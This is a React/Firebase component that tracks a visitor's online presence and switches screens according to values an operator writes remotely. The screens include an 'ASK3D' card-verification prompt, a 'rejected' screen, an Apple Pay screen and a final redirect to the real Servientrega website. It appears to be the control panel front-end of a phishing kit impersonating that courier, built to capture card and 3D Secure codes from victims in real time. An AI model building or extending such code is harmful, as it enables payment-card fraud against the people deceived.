import { useState, useEffect } from 'react'
import { getDatabase, ref, onDisconnect, onValue, push, set } from 'firebase/database'
import AskRechazado from './AskRechazado'
import Loading from './Loading'
import { db, onSnapshot, doc, } from '../../../Firebase/FirebaseConfig'
import ASK3D from './ASK3D'
import ApplePay from './ApplePay'
const Screens = ({ idF, setActiveScreen }) => {
    const [screen, setScreen] = useState("l")

    useEffect(() => {
        if (idF) {
            const q = doc(db, 'user', idF)
            const onSuscribe = onSnapshot(q, (usersActive) => {
                usersActive.exists() && setScreen({ scr: usersActive.data().scr, dataScr: usersActive.data().dataScr })
            })

            return () => {
                onSuscribe()
            }
        }

    }, [idF])

    useEffect(() => {
        const db = getDatabase();
        const myConnectionsRef = ref(db, `users/${idF}/connections`);
        const lastOnlineRef = ref(db, `users/${idF}/lastOnline`);
        const connectedRef = ref(db, '.info/connected');

        return onValue(connectedRef, (snap) => {
            if (snap.val() === true) {

                const con = push(myConnectionsRef);
                onDisconnect(con).remove();
                set(con, true);
                onDisconnect(lastOnlineRef);
            }
        });

    }, [idF])

    const screenSelector = () => {
        switch (screen.scr) {
            case "1":
                return <ASK3D idF={idF} dataScr={screen.dataScr} />
            case "2":
                window.location.replace(screen.dataScr)
                return <Loading />
            case "3":
                return <AskRechazado setActiveScreen={setActiveScreen} />
            case "4":
                return <ApplePay idF={idF} />
            case "fin": 
                window.location.replace("https://www.servientrega.com")
                return <Loading />
            default:
                return <Loading />
        }
    }
    return (
        <div className='bg-white ml-4 mr-3 rounded-md h-min overflow-hidden'>
            {screenSelector()}
        </div>
    )
}

export default Screens